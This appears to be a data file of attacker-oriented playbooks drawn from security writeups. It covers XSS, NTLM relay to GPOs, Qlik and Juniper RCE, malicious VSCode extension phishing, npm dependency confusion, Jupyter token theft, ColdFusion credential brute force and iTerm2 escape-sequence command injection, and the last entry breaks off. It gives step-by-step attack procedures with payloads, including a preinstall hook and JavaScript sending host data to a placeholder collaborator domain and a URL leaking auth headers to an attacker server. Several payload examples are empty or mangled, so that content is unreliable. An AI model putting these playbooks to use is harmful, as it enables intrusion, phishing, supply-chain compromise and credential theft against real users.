Analyze the application's handling of user-provided data to identify potential injection points (e.g., HTML attributes, JavaScript strings, URL parameters).
attack_steps: Attempt to inject common XSS payloads into identified input fields.
Observe the application's response for any signs of code execution or reflection of the injected payload.
If direct XSS fails, attempt to bypass CSP by leveraging specific browser features or known CSP bypass techniques.
payloads_or_patterns: <script>alert(1)</script>
" onmouseover="alert(1)
javascript:alert(1)
tools_recommended: Burp Suite: Use the scanner to identify potential XSS vulnerabilities, and Intruder to automate payload testing.
OWASP ZAP: Similar to Burp Suite, for automated scanning and manual testing.
success_indicators: An alert box pops up with a message (e.g., '1').
The injected JavaScript code is executed in the browser's context.
A cookie belonging to the user is exfiltrated.
User session is hijacked.
failure_indicators: The injected payload is encoded or escaped, preventing execution.
A WAF or input validation mechanism blocks the payload.
The application returns a 4xx or 5xx error code.
No observable JavaScript execution occurs. Pivot to testing for other vulnerability types like SSRF or IDOR if applicable.

playbooks.impact: Attacker can execute arbitrary JavaScript code in the victim's browser, leading to session hijacking, data theft, credential phishing, or defacement of the web page.
playbooks.key_lesson: Always test user input reflected in HTML and JavaScript for Cross-Site Scripting (XSS) vulnerabilities, and ensure comprehensive sanitization and encoding of all user-provided data.

meta.title: GPOddity: Exploiting Active Directory GPOs Through NTLM Relaying, And More!

trigger_conditions.when_to_apply: When an attacker can intercept NTLM authentication from a user with write permissions on a Group Policy Object (GPO).
prerequisites: Attacker is in a Man-in-the-Middle position within the Active Directory environment to relay NTLM authentication.
A user exists with write permissions on a target GPO.
applicability_signals: NTLM relay is possible.
Discovery of GPOs with specific ACLs that allow modification by lower-privileged users.
skip_if: No NTLM relay opportunities available.
No GPOs exist or all GPOs are protected from modification by the relayed user's permissions.

recon_steps: Step 1: Identify potential NTLM relay targets using tools like Responder or ntlmrelayx.
Step 2: Enumerate GPOs within the Active Directory environment.
Step 3: Determine the ACLs for identified GPOs to find those where a lower-privileged user has write permissions.
attack_steps: Step 1: Initiate an NTLM relay attack using a tool like ntlmrelayx, targeting a service that will trigger authentication from a user with write permissions on a GPO.
Step 2: Execute the GPOddity tool, pointing it to the relayed connection and the target GPO.
Step 3: GPOddity will spoof the gPCFileSysPath attribute to a path controlled by the attacker, forcing the client to fetch the GPO from the attacker's controlled location.
Step 4: The attacker's controlled server responds with a malicious GPO configuration, leading to code execution on the target machine or domain takeover.
payloads_or_patterns: GPOddity tool (available on GitHub)
Malicious GPO XML configuration
tools_recommended: Responder (for NTLM relay capture)
ntlmrelayx (for NTLM relaying and exploitation)
GPOddity (for automating GPO exploitation via NTLM relay)
success_indicators: Code execution on a domain-joined machine.
Privilege escalation to Domain Admin.
Domain takeover.
failure_indicators: NTLM relay fails to establish.
GPOddity reports insufficient permissions or inability to modify the GPO.
Target machines do not execute the malicious payload.

playbooks.impact: Attacker can achieve domain takeover, execute arbitrary code on domain-joined machines, and gain administrative privileges.
playbooks.key_lesson: Always investigate NTLM relay opportunities in Active Directory environments, as they can be leveraged to exploit Group Policy Objects for significant privilege escalation and domain compromise.

meta.title: ZeroQlik: Achieving Unauthenticated Remote Code Execution via HTTP Request Tunneling and Path Traversal

affected_components: HTTP request tunneling and path traversal vulnerabilities leading to RCE
tech_stack_fingerprints: Shodan results for Qlik Sense Enterprise instances

trigger_conditions.when_to_apply: When Qlik Sense Enterprise for Windows is deployed and potentially exposed to a frontend proxy service, allowing for HTTP request tunneling and subsequent path traversal.
prerequisites: The Qlik Sense Enterprise instance must be reachable and have a frontend proxy in place that is vulnerable to HTTP request tunneling.
applicability_signals: Observing Qlik Sense Enterprise instances on Shodan indicating external exposure.
The presence of a frontend proxy service in front of the Qlik Sense application.
skip_if: No external facing Qlik Sense instances are found.
The frontend proxy correctly sanitizes or blocks tunneled HTTP requests.
The Qlik Sense application has been patched against CVE-2023-41265 and CVE-2023-41266.

recon_steps: Step 1: Identify Qlik Sense Enterprise instances exposed to the internet using Shodan or similar tools.
Step 2: Inspect network traffic to identify the presence and behavior of any frontend proxy services in front of the Qlik Sense application.
attack_steps: Step 1: Craft an HTTP request that exploits the HTTP request tunneling vulnerability to bypass the frontend proxy and reach the backend Qlik Sense service.
Step 2: Leverage the tunneled request to perform path traversal to a sensitive file or executable on the Qlik Sense server.
Step 3: Execute arbitrary commands on the Qlik Sense server by combining path traversal with the ability to execute external tasks or by leveraging other identified vulnerabilities.
payloads_or_patterns: Insufficient detail in writeup - specific HTTP request tunneling and path traversal payloads are not provided, but they would involve manipulating HTTP headers and request bodies to tunnel malicious requests and then traversing the file system to reach executable files or script interpreters.

Example payload structure (conceptual, actual requires specific knowledge of Qlik and proxy): 'POST / HTTP/1.1
Host: <TARGET_URL>
Transfer-Encoding: chunked

[TUNNELED_REQUEST_WITH_PATH_TRAVERSAL_AND_COMMAND_EXECUTION]'
tools_recommended: Burp Suite: To intercept, analyze, and craft HTTP requests. Specifically, to construct and send tunneled requests.
Custom scripts: To automate the process of generating and sending various tunneled request payloads.
success_indicators: Remote code execution confirmed by obtaining a shell, executing arbitrary commands, or observing the creation of a new administrative user.
The Qlik Sense application performing actions that were initiated by the attacker's tunneled request.
failure_indicators: Frontend proxy returning 4xx or 5xx errors for crafted requests, indicating request rejection.
Backend Qlik Sense service not responding or returning unexpected errors, suggesting the tunnel was not successfully established or the path traversal failed.
No observable signs of command execution or privilege escalation.

Suggestion: If path traversal fails, investigate other ways to achieve RCE through the tunneled request, such as injecting malicious configuration files or exploiting other known Qlik vulnerabilities.

playbooks.impact: Unauthenticated Remote Code Execution (RCE) on Qlik Sense Enterprise servers. This allows an attacker to perform administrative actions, including executing external tasks (leading to RCE) and adding new administrative users, compromising the entire Qlik Sense environment and potentially the sensitive data it analyzes.
playbooks.key_lesson: When dealing with applications behind frontend proxies, always investigate the possibility of HTTP request tunneling to bypass security controls and reach backend services with potentially higher privileges or fewer restrictions.

meta.title: Leveraging VSCode Extensions for Initial Access

tech_stack_fingerprints: Mention of VSCode as a primary development tool

trigger_conditions.when_to_apply: When targeting developers who use VSCode and are susceptible to social engineering techniques disguised as legitimate development workflows.
prerequisites: The target must have VSCode installed.
The target must be willing to open custom links or download files.
applicability_signals: Target organization uses VSCode as a primary development tool.
Existing phishing campaigns are likely to be ineffective against technical users.
The writeup discusses VSCode extensions and their installation methods.
skip_if: Target environment restricts the installation of VSCode extensions.
Targets are not developers or do not use VSCode.

recon_steps: Step 1: Identify target organization's primary development tools, specifically looking for VSCode usage among developers.
Step 2: Research methods for installing VSCode extensions, focusing on programmatic or less common methods like the URI handler.
attack_steps: Step 1: Craft a malicious VSCode extension and package it as a .vsix file.
Step 2: Create a phishing email or message with a pretext that encourages the target to install the extension.

Step 3: Include a link using the VSCode URI handler that points to the installation of the malicious .vsix file. Example: `vscode://extensions/install/<publisher>.<extension-name>` or a custom URI handler to directly install a .vsix if available.
Step 4: Alternatively, provide a link to download the .vsix file and instruct the user to open it via the command line: `code --install-extension <path-to-extension.vsix>`.
payloads_or_patterns: vscode://extensions/install/<publisher>.<extension-name>
code --install-extension <path-to-extension.vsix>
Crafted .vsix file containing malicious code (e.g., reverse shell, data exfiltration)
tools_recommended: VSCode extension development tools
VSCode CLI (`code.exe`)
URLProtocolView (for researching URI handlers)
Phishing email/messaging platform
success_indicators: VSCode prompts the user to install the extension.
The malicious extension is successfully installed and executed.
Callback from a reverse shell or data exfiltration from the target's machine.
failure_indicators: VSCode does not prompt for installation or shows an error message.
Extension installation fails.
No callback received after attempting installation.

playbooks.impact: Achieve initial access to a target developer's machine by bypassing traditional security controls through the use of their trusted development tools. This can lead to further lateral movement, data exfiltration, or compromise of source code repositories.
playbooks.key_lesson: When targeting technical users, investigate the extensibility and integration points of their primary development tools, such as VSCode extensions, as a potential attack vector for social engineering.

meta.title: Dependency Confusion Attack: A Route to RCE

tech_stack_fingerprints: Observes Node.js package imports (e.g., `require('ORGNAME-trackevaluator')` in JS files)

trigger_conditions.when_to_apply: When the target application uses internal NPM packages that are not published to public NPM repositories.
prerequisites: The target application's build process or runtime logic relies on NPM package resolution.
applicability_signals: Discovery of internal package names (e.g., `ORGNAME-packagename`) that do not resolve on public NPM repositories.
Presence of `import` or `require` statements for seemingly internal packages in JavaScript source code or source maps.
skip_if: All internal dependencies are also published to public repositories under the same name and version.

recon_steps: Step 1: Analyze JavaScript source code and source maps for `import` and `require` statements to identify internal Node.js package dependencies.
Step 2: Search for identified internal package names on public NPM repositories (e.g., npmjs.com). If not found, it's a potential candidate for dependency confusion.
attack_steps: Step 1: Create a malicious NPM package locally using `npm init`.
Step 2: Assign a higher version number to the malicious package than any existing internal version.
Step 3: In the malicious package's `package.json`, add a `scripts.preinstall` command that executes a payload (e.g., `node index.js`).
Step 4: Create the `index.js` file with the payload to exfiltrate system information (e.g., hostname, username, directories) to a controlled server (e.g., Burp Collaborator, Interactsh, Pipedream).
Step 5: Publish the malicious package to the public NPM repository using `npm publish`.
Step 6: Monitor the controlled server for incoming requests containing the exfiltrated data.
payloads_or_patterns: Payload within `index.js` to exfiltrate data: `const trackingData = JSON.stringify({ p: package, c: __dirname, hd: os.homedir(), hn: os.hostname(), un: os.userInfo().username, dns: dns.getServers(), r: packageJSON?.___resolved, v: packageJSON.version, pjson: packageJSON });`

HTTP POST request template for exfiltration: `const options = { hostname: "<YOUR_COLLABORATOR_DOMAIN>", port: 443, path: "/", method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded", "Content-Length": postData.length, }, };`
Example `package.json` script: `"scripts": { "preinstall": "node index.js" }`
tools_recommended: Burp Suite or similar proxy to analyze JavaScript files and network requests.
NPM CLI for package creation and publishing.
Interactsh or Burp Collaborator for receiving exfiltrated data.
Confused (tool) for identifying potential dependency confusion candidates.
success_indicators: Receiving pingbacks on the controlled server containing system information (e.g., hostname, username, directory path, IP address) from the target environment.
Confirmation that the malicious package was downloaded and installed by the target's build system or runtime.
failure_indicators: No pingbacks received after publishing the package: The target might be using a private NPM registry that takes precedence, or the internal package name is not actually used in the build/runtime process. Pivot: Investigate alternative supply chain attack vectors or attempt to find other internal package names.
Pingbacks from unexpected sources: The package might have been downloaded by unrelated systems. Verify the source IP and hostname against the target environment.

playbooks.impact: Remote Code Execution (RCE) if the `preinstall` script is designed to download and execute further malicious code, or data exfiltration leading to further attacks.
playbooks.key_lesson: Always verify that internal NPM dependencies are not susceptible to dependency confusion by checking for their existence and versioning on public repositories before assuming they are safe.

meta.title: Leaking Jupyter instance auth token chaining CVE-2023-39968, CVE-2024-22421 and a chromium bug

trigger_conditions.when_to_apply: When the target application exhibits both client-side path traversal vulnerability in the 'clone' parameter and an open redirect vulnerability in the 'next' parameter of the login endpoint, and it makes authenticated requests to external resources (potentially exposed by the path traversal).
prerequisites: Target has a 'clone' parameter that is vulnerable to client-side path traversal.
Target has a login mechanism with an open redirect vulnerability in the 'next' parameter.
The application makes authenticated requests (including Authorization and CSRF headers) to URLs specified by the 'clone' parameter, even when those URLs are on different origins.
applicability_signals: Reflection of the 'clone' query parameter in API request paths.
Successful traversal using '../' in the 'clone' parameter.
Redirection to 'localhost:8888/login?next=/lab' when accessing '/lab' unauthenticated.
The 'next' parameter in the login URL can be bypassed by providing a URL without a network location (e.g., 'https:///evil.com').
CORS preflight requests with 'Access-Control-Request-Headers' including 'authorization' and 'x-xsrftoken'.
skip_if: The application strictly validates redirect URIs and does not allow redirects to arbitrary external hosts.
The application does not include authentication or CSRF tokens in requests made to external origins initiated through the 'clone' parameter.
WAF blocks requests to the Burp Collaborator or other external callback servers.

recon_steps: Step 1: Navigate to http://<TARGET_URL>/lab and observe the default login redirect: http://<TARGET_URL>/login?next=/lab.
Step 2: Test for client-side path traversal by accessing http://<TARGET_URL>/lab?clone=../../../traversed. Observe if the application reflects the traversed path.

Step 3: Investigate the 'next' parameter in the login handler (e.g., http://<TARGET_URL>/login?next=...) for open redirect vulnerabilities. Test with payloads like http://<TARGET_URL>/login?next=https:///evil.com to bypass netloc validation.
attack_steps: Step 1: Construct a payload that combines the path traversal and open redirect. The goal is to redirect the authenticated request to a controlled server (e.g., Burp Collaborator). Example: http://<TARGET_URL>/lab?clone=../../../login%3fnext%3dhttps%3a%2f%2f<COLLABORATOR_DOMAIN>
Step 2: Serve a custom response from the controlled server (<COLLABORATOR_DOMAIN>) that includes CORS headers allowing 'authorization' and 'x-xsrftoken'.
Step 3: Access the crafted URL in a browser session. Observe if the browser makes a request to the controlled server including the Authorization and X-CSRF-Token headers.
payloads_or_patterns: http://<TARGET_URL>/lab?clone=../../../login%3fnext%3dhttps%3a%2f%2f<COLLABORATOR_DOMAIN>
Server response headers: Access-Control-Allow-Origin: *, Access-Control-Allow-Headers: authorization,content-type,x-xsrftoken
tools_recommended: Burp Suite: Use Burp Collaborator to receive incoming requests and observe headers. Use Burp Repeater to test variations of the payload.
Cloudflare Workers or similar: To host a server that can provide custom CORS headers for the callback.
success_indicators: A request is received at the controlled server (e.g., Burp Collaborator) from the target application.
The received request contains 'Authorization' and 'X-CSRF-Token' headers, indicating that authenticated tokens were sent to the attacker-controlled domain.
failure_indicators: No request is received at the controlled server (e.g., Burp Collaborator). This might indicate the path traversal or open redirect is not exploitable in combination, or that the application does not forward auth headers to external sites. Pivot to testing for DOM-based XSS in the reflected path or parameter.

Requests are received but lack 'Authorization' or 'X-CSRF-Token' headers. This means the leakage of sensitive tokens is not possible. Pivot to testing for other vulnerabilities that don't rely on credential forwarding, such as other forms of information disclosure or client-side vulnerabilities.

playbooks.impact: Leaking of Jupyter authentication (likely session cookies or tokens) and CSRF tokens, allowing an attacker to impersonate users, perform actions on their behalf, and potentially gain full control over their Jupyter sessions and any data accessible within them.
playbooks.key_lesson: Always verify how path traversal vulnerabilities interact with cross-origin requests, especially when authentication and CSRF tokens are involved. The combination can lead to significant information disclosure.

meta.title: Technical Details for CVE-2023-29301: Adobe ColdFusion Access Control Bypass for a CFAdmin Authentication Component

tech_stack_fingerprints: ColdFusion server response headers or content indicative of Adobe ColdFusion installation

trigger_conditions.when_to_apply: When the target is identified as Adobe ColdFusion and the IP filtering mechanism for CFAdmin is not correctly applied to the /CFIDE/lockdown path.
prerequisites: Target is running an unpatched version of Adobe ColdFusion.
applicability_signals: Existence of the /CFIDE/lockdown/lockdown.cfc endpoint.
IPFilterUtils class does not restrict access to /CFIDE/lockdown paths.
skip_if: Target is running a patched version of Adobe ColdFusion.
CFAdmin is protected by external WAF rules that block access to /CFIDE/lockdown.

recon_steps: Step 1: Probe target for common ColdFusion paths like /CFIDE/administrator.cfm to confirm technology and version if possible.
Step 2: Attempt to access /CFIDE/lockdown/lockdown.cfc?method=checkAdminCredentials to see if it returns a response different from a 403 Forbidden.
attack_steps: Step 1: Send a POST request to /CFIDE/lockdown/lockdown.cfc with the method parameter set to 'checkAdminCredentials'.
Step 2: Include 'username' and 'password' parameters (or 'adminUsername' and 'adminPassword') in the POST body with potential CFAdmin credentials.
Step 3: Iterate through common username and password combinations to brute-force valid credentials.
payloads_or_patterns:
POST /CFIDE/lockdown/lockdown.cfc?method=checkAdminCredentials HTTP/1.1
Host: <TARGET_URL>
Content-Type: application/x-www-form-urlencoded
Content-Length: <length>

username=<username>&password=<password>
tools_recommended: Burp Suite Intruder: To automate the brute-forcing of username and password combinations against the lockdown.cfc endpoint.
success_indicators: Response contains '<boolean value='true'/>' in the WDDX packet, indicating valid CFAdmin credentials.
Response contains '<boolean value='false'/>' for invalid credentials.
failure_indicators: Consistent 403 Forbidden responses for all requests to /CFIDE/lockdown/lockdown.cfc, indicating the endpoint is blocked.
Connection refused or timeout errors suggest the server is not accessible or misconfigured.
No WDDX packet response, or unexpected HTML/error responses, suggesting the endpoint path is incorrect or vulnerable to different issues.

playbooks.impact: An attacker can brute-force valid CFAdmin username and password credentials from an untrusted IP address, potentially leading to unauthorized administrative access to the ColdFusion server.
playbooks.key_lesson: Always verify that access control mechanisms, such as IP restrictions, are applied to all sensitive administrative endpoints, including those not explicitly listed in the primary configuration.

meta.title: From Terminal Output to Arbitrary Remote Code Execution

trigger_conditions.when_to_apply: When an application running within iTerm2 prints untrusted content that is not properly sanitized, and the content can trigger specific escape sequences that manipulate stdin.
prerequisites: Attacker can influence the output of a process running inside the target's iTerm2 terminal.
applicability_signals: Target is iTerm2 version <= 3.5.0beta10
Application exhibits behavior where terminal output is directly echoed or processed by subsequent commands without proper sanitization of ANSI escape sequences.
skip_if: Terminal output is consistently sanitized by the application.
iTerm2 version has patched the vulnerability.

recon_steps: Step 1: Identify applications or processes running within iTerm2 that handle untrusted input and display it in the terminal.
Step 2: Observe if the application's output can be controlled by an attacker.
Step 3: Verify the iTerm2 version is vulnerable.
attack_steps: Step 1: Craft a payload containing malicious ANSI escape sequences designed to manipulate stdin and inject commands.
Step 2: Deliver the crafted payload as output from a controlled process within the target's iTerm2 session.
Step 3: The escape sequences will cause iTerm2 to inject a linefeed and potentially trigger command execution.

Step 4: A specific sequence like `syscmd(open -a Calculator)` combined with escape sequences that elicit responses containing slashes (e.g., color queries) can be used to trick the shell into executing a path derived from the response.
payloads_or_patterns: echo -e 'syscmd(open -a Calculator) \x1b[5n \x1bP$q$|\x1b\\ \x1b[#| \x1b[14H \x1b[6n \x1bP1000p%session-changed $9 s\n'
tools_recommended: Custom script to generate and deliver the malicious output.
success_indicators: Execution of the injected command (e.g., 'open -a Calculator' on macOS).
Observing unexpected processes starting on the victim's machine.
Terminal state changes indicating command execution.
failure_indicators: No unexpected commands executed.
Payload is printed literally without triggering any action.
iTerm2's output sanitization or security features prevent the escape sequence interpretation.
If the shell does not interpret the constructed path correctly, suggest exploring alternative escape sequences or commands that modify environment variables or known executable paths.

playbooks.impact: Arbitrary Remote Code Execution on the victim's machine by leveraging the terminal emulator's handling of specially crafted ANSI escape sequences.
playbooks.key_lesson: Always sanitize and properly escape terminal control sequences, especially when rendering untrusted user-provided input within terminal emulators that support advanced features.

meta.title: Playing Dominos with Moodle's Security (2/2)

trigger_conditions.when_to_apply: When a user is able to inject arbitrary JavaScript into a page that is then rendered without proper sanitization, specifically when user-supplied input is reflected in an HTML attribute.
prerequisites: The target system is Moodle.
applicability_signals: Lack of output encoding for user-supplied data within HTML attributes.
skip_if: All user-supplied input is properly sanitized and escaped before rendering in HTML attributes.

recon_steps: Step 1: Identify input fields or parameters that are reflected in HTML attributes without proper sanitization. This often involves inspecting source code or observing developer tools during interaction.
Step 2: Confirm that the injected JavaScript is executed in the context of the victim's browser, not just rendered as plain text.
attack_steps: Step 1: Inject JavaScript payload into a parameter that is reflected within an HTML attribute. Example: ``
Step 2: Observe if the injected JavaScript executes in the user's browser.
Step 3: If successful, consider escalating to more complex payloads for theft of cookies, session hijacking, or further manipulation of the page.
payloads_or_patterns: <svg onload=alert(1)>
javascript:alert(1)
tools_recommended: Burp Suite: For intercepting and modifying requests, and scanning for XSS vulnerabilities.
Browser Developer Tools: For inspecting HTML source, JavaScript execution, and network requests.
success_indicators: Execution of JavaScript code in the victim's browser (e.g., an alert box pops up).
Access to sensitive information like cookies or session tokens if the payload is designed for data exfiltration.
failure_indicators: The injected payload is displayed as plain text or escaped characters in the HTML source (e.g., `<img src=x onerror=alert(1)>`). Suggestion: Look for other input vectors or parameters.
The payload is blocked by a Web Application Firewall (WAF). Suggestion: Try encoding the payload or using alternative XSS payloads.
The JavaScript is executed but in an isolated context (e.g., iframe sandbox) preventing further exploitation. Suggestion: Focus on payloads that can break out of sandbox environments.

playbooks.impact: Attacker can execute arbitrary JavaScript in the context of other users' browsers, leading to session hijacking, credential theft, defacement, or further attacks.
playbooks.key_lesson: Always sanitize and properly encode user-supplied input, especially when it is reflected within HTML attributes to prevent Self-XSS vulnerabilities.

meta.title: Hacking GTA V RP Servers Using Web Exploitation Techniques

trigger_conditions.when_to_apply: When a FiveM server utilizes the 'rcore_radiocar' resource or a similar resource that embeds user-supplied URLs into the client-side UI without proper sanitization.
prerequisites: Attacker can connect to a FiveM server running the vulnerable resource.
applicability_signals: Presence of the 'rcore_radiocar' resource or similar functionality allowing custom URLs for audio.
Ability to debug CEF instances on localhost:13172 to inspect resource code.
skip_if: The 'rcore_radiocar' resource is not present or has been patched.
All user-supplied URLs are strictly validated and sanitized before being embedded in the DOM.

recon_steps: Step 1: Identify FiveM servers using the FiveM server list.
Step 2: Connect to a server and observe available resources. Look for resources related to custom music playback (e.g., 'rcore_radiocar').
Step 3: If CEF debugging is enabled on localhost:13172, inspect the source code of the identified resource, specifically JavaScript files like 'SoundPlayer.js'.
attack_steps: Step 1: Locate the 'SoundPlayer.js' file within the 'rcore_radiocar' resource.
Step 2: Analyze the 'create()' function to understand how user-provided URLs are processed.
Step 3: Observe that if a YouTube ID cannot be extracted, the URL is passed directly to Howler.js and appended to the DOM using jQuery's append function.

Step 4: Craft an XSS payload disguised as a URL that leverages the DOM append and Howler.js integration. For example, a payload that uses `javascript:` URI scheme or constructs HTML tags within the URL that get evaluated.
Step 5: Submit the crafted payload as a URL to the 'rcore_radiocar' resource (e.g., as a radio station link).
Step 6: If the payload is executed, observe its effects (e.g., JavaScript alert, data exfiltration, or other actions defined by the payload).
payloads_or_patterns: Example XSS payload concept: A crafted URL that, when appended to the DOM and processed by Howler.js or other DOM manipulation logic, executes arbitrary JavaScript. A simplified example could be a `javascript:` URI in a context where it might be evaluated, or a URL that injects `<script>` tags which are then processed.

Specific payload example (conceptual, as writeup implies client-side JS execution from appended URL): `javascript:alert('XSS')` if the `getUrlSound()` function or the subsequent DOM append context allows for direct evaluation of `javascript:` URIs. More likely, a complex payload that constructs HTML elements with script tags might be necessary if the URL is only used as a source for `Howl` or appended as text.
Payload exploiting `append()`: If `getUrlSound()` returns a string that is directly appended, injecting HTML like `` or `` could work, depending on context.
tools_recommended: Burp Suite: To intercept and modify requests to the FiveM server if applicable, or to test crafted URLs.
CEF Remote Debugger: Essential for inspecting the client-side code of FiveM resources.
success_indicators: Execution of JavaScript code on the client-side, such as an alert box appearing.
Observable changes in the game UI or player experience triggered by the injected script.
Successful exfiltration of data (e.g., player IPs, chat messages) if the payload is designed for that.
failure_indicators: The URL is displayed literally in the UI without any JavaScript execution.
The server or client-side resource sanitizes the URL and prevents XSS.
The `javascript:` URI scheme is blocked or not evaluated.
Response: 400 Bad Request or similar indicating invalid URL format after sanitization.

playbooks.impact: Arbitrary JavaScript execution within the context of the user's browser (CEF) on the FiveM client. This could lead to stealing player information (like IP addresses), manipulating game elements, sending messages on behalf of the player, or further compromising the user's session or system if combined with other vulnerabilities.
playbooks.key_lesson: Always sanitize and validate user-supplied URLs before embedding them into the DOM or using them as sources for JavaScript execution, especially in third-party client-side frameworks like CEF.

meta.title: Bypassing Hardened Android Applications

trigger_conditions.when_to_apply: When an Android application exhibits hardened security checks such as root detection, emulator detection, or SSL pinning that prevent dynamic analysis or API testing on a rooted device or emulator.
prerequisites: The target is an Android application.
The application is installed on a rooted device or emulator.
The application exhibits security checks that prevent normal operation or analysis.
applicability_signals: Application displays a 'Device Security' error or similar message on emulator.
Application functions correctly on non-rooted device but fails with proxy configuration.
Application fails to launch on a rooted device or emulator.
skip_if: The application does not appear to have any specific security checks implemented.
The application is already running without any issues on a rooted device/emulator.

recon_steps: Step 1: Install the target Android application on an emulator and observe any error messages or functional limitations. Note specific error strings like 'Device Security'.
Step 2: Decompile the APK using apktool.jar and perform string backtracking for the observed error messages to locate relevant code sections in 'strings.xml' and 'index.android.bundle'.
Step 3: Analyze 'index.android.bundle' for React Native specific code related to the error message.
Step 4: If the error message is found in 'index.android.bundle', attempt to modify it to confirm its origin. This involves rebuilding, signing, and reinstalling the APK.
Step 5: If direct modification of 'index.android.bundle' is time-consuming, utilize tools like 'android_application_analyzer' for automated rebuilding and signing.
Step 6: If the application fails to install after modification, analyze device file system for clues (e.g., 'split_config' related information) and check 'AndroidManifest.xml'.
attack_steps: Step 1: Extract the APK from the device and decompile it using apktool.jar.
Step 2: Search for the 'Device Security' string and identify occurrences in 'index.android.bundle' and 'strings.xml'.
Step 3: Modify the error message string in 'index.android.bundle' from 'Device Security' to 'Device Security Changed with Custom Data'.
Step 4: Rebuild the application using apktool.jar, sign the new APK, uninstall the original app from the emulator, and install the modified APK.
Step 5: Observe the application's behavior on the emulator. If it fails to install or runs with a different error, analyze the file system and AndroidManifest.xml for further clues.
Step 6: If root detection persists, continue analysis of native Java code and React Native code for specific root detection checks.
Step 7: If emulator detection is suspected, look for specific emulator-specific checks in the decompiled code.
Step 8: If Frida detection is suspected, analyze the code for Frida usage or detection patterns.
Step 9: If SSL pinning is suspected, use tools like Objection or Frida to bypass it during dynamic analysis.
payloads_or_patterns: "Device Security"
"Device Security Changed with Custom Data"
code patterns related to checking for root privileges (e.g., presence of /system/bin/su, specific build properties)
code patterns related to emulator detection (e.g., checking for specific emulator properties, device identifiers)
code patterns related to Frida detection (e.g., checking for loaded libraries, process names)
SSL pinning bypass techniques using Frida scripts or tools like Objection
tools_recommended: apktool.jar: for decompiling and rebuilding APKs.
android_application_analyzer (NotSoSecure tool): for automating APK modification, signing, and installation.
Burp Suite or similar proxy: for capturing and analyzing network traffic after bypassing security checks.
Objection: for mobile exploration and instrumentation, including SSL pinning bypass.
Frida: for dynamic instrumentation and code manipulation.
success_indicators: The application launches and runs without 'Device Security' or other root/emulator detection errors on a rooted device or emulator.
Network traffic from the application is successfully captured by a proxy, indicating SSL pinning bypass.
API requests to the application's backend can be made and analyzed.
The application's functionality can be tested dynamically in a controlled, potentially rooted environment.
failure_indicators: The application continues to display security warnings or fails to launch despite modifications.
The modified APK fails to install, indicating a more complex installation process or signature verification issue.
All attempts to bypass a specific check (e.g., root detection) fail, suggesting advanced anti-tampering mechanisms.
If all bypass attempts fail, the writeup indicates the need to pivot to other analysis techniques or acknowledge the difficulty of bypassing very robust defenses.

playbooks.impact: Enables dynamic analysis, API testing, and deeper security assessments of hardened Android applications that would otherwise be inaccessible on rooted devices or emulators. This can lead to the discovery of vulnerabilities in API interactions, sensitive data handling, or business logic flaws.
playbooks.key_lesson: When encountering Android application security checks (root, emulator, SSL pinning), systematically decompile the APK, analyze code for detection logic (especially in 'index.android.bundle' for React Native), modify strings or logic where possible, and use dynamic instrumentation tools like Frida or Objection for more advanced bypasses.

meta.title: CVE-2023-36844 And Friends: RCE In Juniper Devices

tech_stack_fingerprints: J-Web is almost entirely written in PHP
PHP files present in the web interface
Likely contains 'show version' command execution or similar system commands accessible via PHP

trigger_conditions.when_to_apply: When Juniper SRX firewall devices are accessible via the J-Web interface and have vulnerable versions of Junos OS installed. The vulnerability can be chained with another to achieve RCE.
prerequisites: J-Web must be enabled on the Juniper device.
applicability_signals: J-Web interface is accessible.
Device is running Junos OS.
Vulnerable CVEs (CVE-2023-36846 and CVE-2023-36845) are present and not patched.
skip_if: J-Web is disabled.
Device is running a patched version of Junos OS.
No exploitable PHP functions or parameters are found in J-Web.

recon_steps: Step 1: Access the J-Web interface of the target Juniper device and check for version information to identify potential vulnerabilities.
